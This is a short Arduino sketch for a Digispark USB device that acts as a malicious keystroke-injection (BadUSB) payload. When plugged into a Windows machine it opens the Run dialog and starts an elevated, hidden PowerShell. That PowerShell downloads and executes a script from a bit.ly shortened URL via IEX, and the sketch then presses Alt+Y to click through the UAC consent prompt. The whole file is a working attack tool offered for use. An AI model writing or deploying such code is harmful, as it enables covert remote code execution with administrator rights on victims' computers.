#include "DigiKeyboard.h"

void winRun(const char* command){
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT  ); // press the windows key
  DigiKeyboard.delay(300); // wait a second
  DigiKeyboard.println(command);
}

void setup() {
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(0);

  winRun("powershell \"Start-Process powershell -Verb RunAs -ArgumentList '-W','Hidden', \\\"IEX (New-Object Net.WebClient).DownloadString(\'https://bit.ly/3HXQQOr\');\\\"  \"  ");
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_T, MOD_ALT_LEFT);
}

void loop() {
  DigiKeyboard.update();
}
